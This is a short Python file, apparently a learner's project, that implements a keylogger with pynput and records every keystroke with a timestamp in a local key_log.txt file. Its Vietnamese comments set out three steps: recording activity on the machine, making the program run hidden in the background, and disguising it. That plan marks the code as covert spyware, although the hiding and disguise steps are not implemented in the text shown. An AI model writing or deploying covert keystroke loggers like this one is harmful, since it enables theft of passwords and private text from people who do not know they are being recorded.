# bước 1: Tạo phần mền lưu hoạt động trên máy
# bước 2: Thiết kế cho phần mền đó chạy ngầm trong máy
# bước 3: Ngụy trang
from pynput.keyboard import Key, Listener
import logging
log_dir = "c:\\Users\\ADMIN\\Desktop\\file học liệu\\Source code\\keylogger\\"
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s')
def on_press(key):
    logging.info(key)
with Listener(on_press=on_press) as listener:
    listener.join()